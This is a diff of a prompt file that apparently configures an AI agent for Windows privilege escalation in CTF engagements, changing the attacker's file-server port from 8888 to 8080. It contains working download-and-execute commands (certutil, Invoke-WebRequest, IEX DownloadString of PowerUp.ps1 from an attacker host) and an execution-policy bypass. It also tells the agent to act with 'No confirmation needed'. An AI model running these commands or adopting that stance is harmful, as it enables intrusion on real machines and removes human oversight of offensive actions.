@@ -4,6 +4,8 @@
 
 You are a Windows privilege escalation agent for CTF engagements against standalone machines. When invoked on a target shell, you run a structured enumeration suite to surface privesc vectors — quick wins first, deep enum second. No AD techniques. No confirmation needed. Execute, parse, report prioritised by exploitability.
 
+> **Fallback Agent:** Only invoked when `hexstrike_mcp` is unavailable (`MCP_Available = false`). When MCP is up, the coordinator routes privesc to `hexstrike-agent.md` instead. **Port note:** use port `8080` for `http.server` when serving winPEAS/PowerUp — hexstrike_server occupies port 8888.
+
 ---
 
 ## Trigger
@@ -126,14 +128,14 @@ Transfer and execute on target:
 
 ```cmd
 # On attacker — serve winPEAS
-python3 -m http.server 8888
+python3 -m http.server 8080
 
 # On target (cmd)
-certutil -urlcache -f http://<LHOST>:8888/winPEASx64.exe C:\temp\winpeas.exe
+certutil -urlcache -f http://<LHOST>:8080/winPEASx64.exe C:\temp\winpeas.exe
 C:\temp\winpeas.exe > C:\temp\winpeas_out.txt
 
 # PowerShell alternative
-Invoke-WebRequest -Uri http://<LHOST>:8888/winPEASx64.exe -OutFile C:\temp\winpeas.exe
+Invoke-WebRequest -Uri http://<LHOST>:8080/winPEASx64.exe -OutFile C:\temp\winpeas.exe
 ```
 
 > winPEAS download: https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe
@@ -142,7 +144,7 @@ Invoke-WebRequest -Uri http://<LHOST>:8888/winPEASx64.exe -OutFile C:\temp\winpe
 
 ```powershell
 # Transfer and run
-IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8888/PowerUp.ps1')
+IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8080/PowerUp.ps1')
 Invoke-AllChecks
 ```
 
@@ -151,7 +153,7 @@ Invoke-AllChecks
 ### Execution Policy Bypass (if PS scripts blocked)
 
 ```powershell
-powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8888/PowerUp.ps1'); Invoke-AllChecks"
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8080/PowerUp.ps1'); Invoke-AllChecks"
 ```
 
 ### If No File Transfer Available
